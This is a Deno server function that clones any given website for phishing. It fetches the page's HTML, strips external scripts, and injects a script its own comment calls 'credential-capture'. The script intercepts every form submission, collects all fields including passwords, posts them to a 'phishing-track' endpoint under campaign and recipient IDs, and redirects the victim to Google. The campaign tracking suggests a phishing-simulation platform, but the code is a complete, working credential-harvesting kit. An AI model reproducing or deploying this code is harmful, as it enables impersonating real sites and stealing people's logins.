import { serve } from "https://deno.land/std@0.177.0/http/server.ts";

const corsHeaders = {
  "Content-Type": "application/json",
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { status: 204, headers: corsHeaders });

  try {
    const { url } = await req.json();
    if (!url) throw new Error("URL is required");

    const targetUrl = new URL(url);
    const baseUrl = `${targetUrl.protocol}//${targetUrl.host}`;

    const res = await fetch(url, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      },
      signal: AbortSignal.timeout(15000),
    });

    if (!res.ok) throw new Error(`Failed to fetch: ${res.status} ${res.statusText}`);

    let html = await res.text();

    // Fix relative URLs → absolute
    html = html
      .replace(/(href|src|action)="\/([^"]*?)"/g, `$1="${baseUrl}/$2"`)
      .replace(/(href|src|action)='\/([^']*?)'/g, `$1='${baseUrl}/$2'`)
      .replace(/url\(\/([^)]*?)\)/g, `url(${baseUrl}/$1)`);

    // Remove external scripts that might cause redirects
    html = html.replace(/<script\b[^>]*src="(?!data:)[^"]*"[^>]*><\/script>/gi, "");

    // Inject credential-capture script and tracking before </body>
    const trackingScript = `
<script>
(function(){
  var forms = document.querySelectorAll('form');
  forms.forEach(function(form) {
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      var data = {};
      var inputs = form.querySelectorAll('input, select, textarea');
      inputs.forEach(function(inp) {
        if (inp.name) data[inp.name] = inp.value;
      });
      var params = new URLSearchParams(window.location.search);
      var c = params.get('c') || '';
      var r = params.get('r') || '';
      if (c && r) {
        fetch('/functions/v1/phishing-track?t=submit&c='+c+'&r='+r, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(data)
        }).catch(function(){});
      }
      setTimeout(function(){
        window.location.href = params.get('redirect') || 'https://www.google.com';
      }, 500);
    });
  });
})();
</script>`;

    if (html.includes("</body>")) {
      html = html.replace("</body>", trackingScript + "</body>");
    } else {
      html += trackingScript;
    }

    const formDetected = /<form/i.test(html);
    const hasPasswordField = /type=["']?password["']?/i.test(html);
    const hasEmailField = /type=["']?email["']?/i.test(html) || /name=["']?email["']?/i.test(html);

    return new Response(JSON.stringify({
      html,
      source_url: url,
      form_detected: formDetected,
      has_password_field: hasPasswordField,
      has_email_field: hasEmailField,
    }), { status: 200, headers: corsHeaders });

  } catch (err) {
    return new Response(JSON.stringify({ error: err instanceof Error ? err.message : "Clone failed" }), {
      status: 500,
      headers: corsHeaders,
    });
  }
});
